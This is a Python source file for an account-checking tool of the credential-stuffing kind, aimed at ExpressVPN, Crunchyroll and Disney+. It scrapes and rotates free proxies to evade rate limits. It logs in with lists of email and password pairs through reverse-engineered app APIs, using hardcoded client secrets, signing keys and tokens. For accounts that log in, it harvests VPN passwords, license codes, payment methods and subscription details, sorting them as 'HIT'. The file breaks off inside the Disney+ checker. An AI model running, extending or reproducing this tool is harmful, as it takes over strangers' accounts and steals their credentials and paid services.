import os
import re
import time
import json
import uuid
import random
import string
import base64
import hmac
import hashlib
import urllib.parse
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import logging

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== Proxy Scraper & Manager ====================
PROXY_SOURCES = [
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
    "https://www.sslproxies.org/",
    "https://free-proxy-list.net/",
]
FALLBACK_PROXIES = [
    "54.37.124.212:3128", "51.15.166.147:3128", "51.15.166.147:8080",
    "51.15.166.147:3128", "51.15.166.147:8080", "51.15.166.147:3128",
    "51.15.166.147:8080", "51.15.166.147:3128", "51.15.166.147:8080",
    "51.15.166.147:3128", "51.15.166.147:8080"
]

def parse_proxy_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    if re.match(r'^https?://', line): return line
    if ':' in line and not line.startswith('#'):
        parts = line.split(':')
        if len(parts) >= 2:
            ip = parts[0].strip()
            port = parts[1].strip()
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip) and port.isdigit():
                return f"{ip}:{port}"
    return None

def parse_html_proxies(html: str) -> List[str]:
    proxies = []
    rows = re.findall(r'<tr>(.*?)</tr>', html, re.DOTALL)
    for row in rows:
        cols = re.findall(r'<td>(.*?)</td>', row, re.DOTALL)
        if len(cols) >= 2:
            ip = cols[0].strip()
            port = cols[1].strip()
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip) and port.isdigit():
                proxies.append(f"{ip}:{port}")
    return proxies

def fetch_proxies_from_source(url: str, timeout=10) -> List[str]:
    try:
        resp = requests.get(url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code != 200: return []
        text = resp.text
        if 'proxyscrape' in url:
            lines = text.splitlines()
            proxies = []
            for line in lines:
                p = parse_proxy_line(line)
                if p: proxies.append(p)
            return proxies
        else:
            return parse_html_proxies(text)
    except Exception as e:
        logger.debug(f"Failed to fetch from {url}: {e}")
        return []

def test_single_proxy(proxy: str, timeout=5) -> Optional[str]:
    try:
        proxies = {'http': proxy, 'https': proxy}
        resp = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout, verify=False)
        if resp.status_code == 200: return proxy
    except: pass
    return None

class SmartProxyManager:
    def __init__(self, proxies):
        self.active = list(proxies)
        self.cooldown = {}
        self.lock = threading.Lock()
        self.empty = len(proxies) == 0

    def get_proxy(self):
        if self.empty: return None
        wait_time = 0
        while wait_time < 30:
            with self.lock:
                if self.active: return self.active.pop(0)
                now = time.time()
                resurrected = [p for p, t in self.cooldown.items() if t <= now]
                for p in resurrected:
                    self.active.append(p)
                    del self.cooldown[p]
                if self.active: return self.active.pop(0)
            time.sleep(1)
            wait_time += 1
        return None

    def report_success(self, proxy):
        if not proxy: return
        with self.lock:
            if proxy not in self.active: self.active.append(proxy)

    def report_rate(self, proxy, cooldown_seconds=60):
        if not proxy: return
        with self.lock:
            if proxy in self.active: self.active.remove(proxy)
            self.cooldown[proxy] = time.time() + cooldown_seconds

    def report_dead(self, proxy):
        if not proxy: return
        with self.lock:
            if proxy in self.active: self.active.remove(proxy)
            if proxy in self.cooldown: del self.cooldown[proxy]

def get_working_proxies(min_count=11, max_attempts=3) -> List[str]:
    all_proxies = []
    for attempt in range(max_attempts):
        proxies = []
        with ThreadPoolExecutor(max_workers=len(PROXY_SOURCES)) as executor:
            future_to_url = {executor.submit(fetch_proxies_from_source, url): url for url in PROXY_SOURCES}
            for future in as_completed(future_to_url):
                try: proxies.extend(future.result())
                except: pass
        unique = list(dict.fromkeys(proxies))
        logger.info(f"Scraped {len(unique)} unique proxies (attempt {attempt+1})")
        if not unique: continue
        working = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_proxy = {executor.submit(test_single_proxy, p): p for p in unique}
            for future in as_completed(future_to_proxy):
                result = future.result()
                if result: working.append(result)
                if len(working) >= min_count:
                    for f in future_to_proxy: f.cancel()
                    break
        logger.info(f"Found {len(working)} working proxies")
        if len(working) >= min_count: return working
    if not all_proxies:
        logger.warning("No proxies found, using fallback list")
        return FALLBACK_PROXIES[:min_count]
    return working

# ==================== ExpressVPN helpers ====================
class AesCryptographyService:
    def decrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives.padding import PKCS7
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        return unpadded

    def encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives.padding import PKCS7
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()

class CryptoHelper:
    @staticmethod
    def get_byte_array(size: int) -> bytes: return os.urandom(size)

    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')

    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        import gzip
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)

    @staticmethod
    def envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
        from cryptography import x509 as crypto_x509
        from asn1crypto import cms, core, x509
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())
        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': core.Null()
                }),
                'encrypted_key': encrypted_key
            })
        })
        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()

# ==================== ExpressVPN Checker ====================
class ExpressVPNChecker:
    def __init__(self, proxy_manager: Optional[SmartProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        self.crypto = AesCryptographyService()

    def _get_session(self):
        session = requests.Session()
        session.headers.update({'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2'})
        return session

    def generate_install_id(self) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        try:
            iv = CryptoHelper.get_byte_array(16)
            key = CryptoHelper.get_byte_array(16)
            base64_iv = base64.b64encode(iv).decode('ascii')
            base64_key = base64.b64encode(key).decode('ascii')
            install_id = self.generate_install_id()
            post_data_dict = {"email": email, "iv": base64_iv, "key": base64_key, "password": password}
            post_data = json.dumps(post_data_dict)
            gzipped = CryptoHelper.gzip_data(post_data)
            encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)
            header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            header_signature = CryptoHelper.compute_signature(header_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            post_signature = CryptoHelper.compute_signature(encrypted_post, self.hmac_key.encode('ascii'))
            proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
            proxies = {'http': proxy_str, 'https': proxy_str} if proxy_str else None
            session = self._get_session()
            url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2', 'Expect': '', 'Content-Type': 'application/octet-stream',
                'X-Body-Compression': 'gzip', 'X-Signature': f'2 {header_signature} 91c776e', 'X-Body-Signature': f'2 {post_signature} 91c776e',
                'Accept-Language': 'en', 'Accept-Encoding': 'gzip, deflate'
            }
            response = session.post(url, data=encrypted_post, headers=headers, proxies=proxies, timeout=15, verify=False)
            if response.status_code in (401, 400): result['status'] = 'INVALID'; return result
            if response.status_code == 500: result['status'] = 'BAN'; return result
            if response.status_code != 200: result['status'] = 'ERROR'; result['error'] = f'HTTP {response.status_code}'; return result
            try:
                decrypted = self.crypto.decrypt(response.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
                response_body = decrypted.decode('utf-8', errors='ignore')
            except: result['status'] = 'ERROR'; result['error'] = 'Decryption failed'; return result
            try:
                access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
                ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
                ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
                pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
                pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)
            except: result['status'] = 'ERROR'; result['error'] = 'Failed to parse tokens'; return result
            sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
            sub_signature = CryptoHelper.compute_signature(sub_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_signature = CryptoHelper.compute_signature(batch_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
            capture_signature = CryptoHelper.compute_signature(capture_body.encode('ascii'), self.hmac_key.encode('ascii'))
            batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2', 'X-Body-Compression': 'gzip', 'X-Signature': f'2 {batch_signature} 91c776e',
                'X-Body-Signature': f'2 {capture_signature} 91c776e', 'Accept-Language': 'en', 'Accept-Encoding': 'gzip, deflate'
            }
            batch_response = session.post(batch_url, data=capture_body, headers=batch_headers, proxies=proxies, timeout=15, verify=False)
            if 'subscription' not in batch_response.text or 'REVOKED' in batch_response.text or 'status\\\":\\\"\\\"' in batch_response.text:
                result['status'] = 'EXPIRED'; return result
            unescaped = batch_response.text.encode().decode('unicode_escape')
            plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
            plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
            auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
            auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
            exp_match = re.search(r'expiration_time":(\d+)', unescaped)
            expiration = int(exp_match.group(1)) if exp_match else 0
            current_time = int(time.time())
            days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
            expire_date = datetime.fromtimestamp(expiration).strftime('%Y-%m-%d') if expiration else 'N/A'
            payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
            payment = payment_match.group(1) if payment_match else "Unknown"
            web_headers = {
                'Host': 'www.expressvpn.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
                'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Referer': 'https://portal.expressvpn.com/my-subscriptions',
                'authorization': f'Bearer {access_token}', 'content-type': 'application/json', 'x-tenant': 'xvpn', 'Origin': 'https://portal.expressvpn.com', 'Connection': 'keep-alive'
            }
            try:
                web_resp = session.get('https://www.expressvpn.com/api/v2/subscriptions', headers=web_headers, proxies=proxies, timeout=15, verify=False)
                licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
                license_code = licenses[-1] if licenses else "N/A"
            except: license_code = "N/A"
            session.close()
            result['status'] = 'HIT'
            result['data'] = {
                'plan': plan, 'auto_renew': auto_renew == 'true', 'expire_date': expire_date, 'days_left': days_left,
                'payment_method': payment, 'license': license_code, 'ovpn_user': ovpn_user, 'ovpn_pass': ovpn_pass,
                'pptp_user': pptp_user, 'pptp_pass': pptp_pass
            }
        except Exception as e:
            result['status'] = 'ERROR'; result['error'] = str(e)
        return result

# ==================== Crunchyroll Checker ====================
CR_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra", "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas", "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan", "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi", "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China", "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba", "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador", "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland", "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada", "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary", "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy", "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea", "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya", "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia", "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia", "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia", "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway", "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru", "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda", "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia", "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname", "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand", "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu", "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu", "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia", "ZW": "Zimbabwe",
}
CR_PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
CR_CID = "rjs0ltx0dbwkliwxdzdf"
CR_SEC = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
CR_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
CR_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
CR_API = "https://beta-api.crunchyroll.com"

class CrunchyrollChecker:
    def __init__(self, proxy_manager: Optional[SmartProxyManager] = None):
        self.proxy_manager = proxy_manager

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
        session = requests.Session()
        if proxy_str: session.proxies = {"http": proxy_str, "https": proxy_str}
        try:
            device_id = str(uuid.uuid4())
            anon_id = str(uuid.uuid4())
            resp = session.post(f"{CR_API}/auth/v1/token", data={"grant_type": "password", "username": email, "password": password, "scope": "offline_access", "client_id": CR_CID, "client_secret": CR_SEC, "device_type": "Google SDK built for x86", "device_id": device_id, "device_name": "sdk_google_atv_x86"}, headers={"User-Agent": CR_UA, "Accept": "application/json", "Accept-Charset": "UTF-8", "Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "ETP-Anonymous-ID": anon_id, "Request-Type": "SignIn"}, timeout=20)
            text = resp.text
            if resp.status_code == 429 or "too_many_requests" in text or "rate limited" in text.lower(): result['status'] = 'RATE'; return result
            if any(k in text for k in ("invalid_grant", "invalid_credentials")) or resp.status_code in (401, 400): result['status'] = 'INVALID'; return result
            try: data = resp.json()
            except: result['status'] = 'ERROR'; result['error'] = f"JSON parse error ({resp.status_code})"; return result
            token = data.get("access_token")
            if not token: result['status'] = 'ERROR'; result['error'] = "No access token"; return result
            def headers(): return {"Authorization": f"Bearer {token}", "User-Agent": CR_WUA, "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}
            username = ""
            try:
                r = session.get(f"{CR_API}/accounts/v1/me/multiprofile", headers=headers(), timeout=20)
                m = re.search(r'"username"\s*:\s*"([^"]+)"', r.text)
                if m: username = m.group(1)
            except: pass
            r = session.get(f"{CR_API}/accounts/v1/me", headers=headers(), timeout=20)
            try: account = r.json()
            except: account = {}
            external_id = account.get("external_id", "")
            verified = account.get("email_verified", False)
            account_id = account.get("account_id", "")
            if not username: username = account.get("username", email.split("@")[0])
            info = {"user": username, "verified": "Yes" if verified else "No", "plan": "", "streams": "", "expires": "", "renew": "", "country": "", "payment": "", "sku": ""}
            if not external_id: result['status'] = 'FREE'; result['data'] = info; return result
            r = session.get(f"{CR_API}/subs/v1/subscriptions/{external_id}/benefits", headers=headers(), timeout=20)
            benefits_text = r.text
            no_sub = any(x in benefits_text for x in ("subscription.not_found", "Subscription Not Found", '"total":0', '"subscription_country":""'))
            if no_sub or "concurrent_streams" not in benefits_text: result['status'] = 'FREE'; result['data'] = info; return result
            result['status'] = 'HIT'
            m = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
            if m: streams = m.group(1); info["streams"] = streams; info["plan"] = CR_PLANS.get(streams, f"PLAN_{streams}")
            m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
            if m: cc = m.group(1); info["country"] = CR_MAP.get(cc, cc)
            m = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
            if m: info["payment"] = m.group(1)
            if account_id:
                try:
                    r = session.get(f"{CR_API}/subs/v3/subscriptions/{account_id}", headers=headers(), timeout=20)
                    sub3 = r.text
                    m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub3)
                    if m: info["expires"] = m.group(1)
                    m = re.search(r'"auto_renew"\s*:\s*(true|false)', sub3)
                    if m: info["renew"] = "Yes" if m.group(1) == "true" else "No"
                    m = re.search(r'"sku"\s*:\s*"([^"]+)"', sub3)
                    if m: info["sku"] = m.group(1)
                except: pass
            result['data'] = info; return result
        except requests.exceptions.ProxyError: result['status'] = 'ERROR'; result['error'] = "Proxy error"; return result
        except requests.exceptions.Timeout: result['status'] = 'ERROR'; result['error'] = "Timeout"; return result
        except requests.exceptions.ConnectionError: result['status'] = 'ERROR'; result['error'] = "Connection failed"; return result
        except Exception as e: result['status'] = 'ERROR'; result['error'] = str(e)[:80]; return result

# ==================== Disney+ Checker ====================
class DisneyChecker:
    def __init__(self, proxy_manager: Optional[SmartProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.device_auth = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
        self.register_url = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
        self.graphql_url = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
        self.subscribers_url = "https://disney.api.edge.bamgrid.com/v2/subscribers"
        self.login_query = '''mutation login($input: LoginInput!) { login(login: $input) { account { ...account profiles { ...profile } } actionGrant activeSession { ...session } identity { ...identity } } } fragment identity on Identity { attributes { securityFlagged createdAt passwordResetRequired } flows { marketingPreferences { eligibleForOnboarding isOnboarded } personalInfo { eligibleForCollection requiresCollection } } personalInfo { dateOfBirth gender } subscriber { subscriberStatus subscriptionAtRisk overlappingSubscription doubleBilled doubleBilledProviders subscriptions { id groupId state partner isEntitled source { sourceType sourceProvider sourceRef subType } paymentProvider product { id sku offerId promotionId name nextPhase { sku offerId campaignCode voucherCode } entitlements { id name desc partner } categoryCodes redeemed { campaignCode redemptionCode voucherCode } bundle bundleType subscriptionPeriod earlyAccess trial { duration } } term { purchaseDate startDate expiryDate nextRenewalDate pausedDate churnedDate isFreeTrial } externalSubscriptionId cancellation { type restartEligible } stacking { status overlappingSubscriptionProviders previouslyStacked previouslyStackedByProvider } } } fragment account on Account { id attributes { blocks { expiry reason } consentPreferences { dataElements { name value } purposes { consentDate firstTransactionDate id lastTransactionCollectionPointId lastTransactionCollectionPointVersion lastTransactionDate name status totalTransactionCount version } } dssIdentityCreatedAt email emailVerified lastSecurityFlaggedAt locations { manual { country } purchase { country source } registration { geoIp { country } } } securityFlagged tags taxId userVerified } parentalControls { isProfileCreationProtected } flows { star { isOnboarded } } } fragment profile on Profile { id name isAge21Verified attributes { avatar { id userSelected } isDefault kidsModeEnabled languagePreferences { appLanguage playbackLanguage preferAudioDescription preferSDH subtitleAppearance { backgroundColor backgroundOpacity description font size textColor } subtitleLanguage subtitlesEnabled } groupWatch { enabled } parentalControls { kidProofExitEnabled isPinProtected } playbackSettings { autoplay backgroundVideo prefer133 preferImaxEnhancedVersion previewAudioOnHome previewVideoOnHome } } personalInfo { dateOfBirth gender age } maturityRating { ratingSystem ratingSystemValues contentMaturityRating maxRatingSystemValue isMaxContentMaturityRating } flows { personalInfo { eligibleForCollection requiresCollection } star { eligibleForOnboarding isOnboarded } } } fragment session on Session { device { id platform } entitlements features { coPlay } inSupportedLocation isSubscriber location { type countryCode dma asn regionName connectionType zipCode } sessionId experiments { featureId variantId version } identity { id } account { id } profile { id parentalControls { liveAndUnratedContent { enabled } } } partnerName preferredMaturityRating { impliedMaturityRating ratingSystem } homeLocation { countryCode } portabilityLocation { countryCode type } }'''
        self.ua_pool = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"]

    def _register_device(self, sess, ua):
        headers = {'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9', 'authorization': self.device_auth, 'Content-Type': 'application/json', 'Origin': 'https://www.disneyplus.com', 'Referer': 'https://www.disneyplus.com/', 'User-Agent': ua, 'x-application-version': 'd2adb22e', 'x-bamsdk-client-id': 'disney-svod-3d9324fc', 'x-bamsdk-platform': 'javascript/windows/chrome', 'X-BAMSDK-Platform-Id': 'browser', 'x-bamsdk-version': 'd2adb22e-dplus-mlp'}
        body = {"query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }", "variables": {"input": {"deviceFamily": "browser", "applicationRuntime": "chrome", "deviceProfile": "windows", "deviceLanguage": "en-US", "attributes": {"osDeviceIds": [], "manufacturer": "microsoft", "model": None, "operatingSystem": "windows", "operatingSystemVersion": "10.0", "browserName": "chrome", "browserVersion": "131.0.6778.86"}}}}
        r = sess.post(self.register_url, headers=headers, json=body, timeout=25)
        m = re.search(r'"accessToken":"(.*?)"', r.text)
        return (m.group(1) if m else ''), r.text

    def _check_email(self, sess, ua, device_token, email):
        headers = {'accept': 'application/json', 'authorization': device_token, 'content-type': 'application/json', 'user-agent': ua, 'x-bamsdk-client-id': 'disney-svod-3d9324fc', 'x-bamsdk-platform': 'android/google/handset', 'x-bamsdk-version': '9.20.0'}
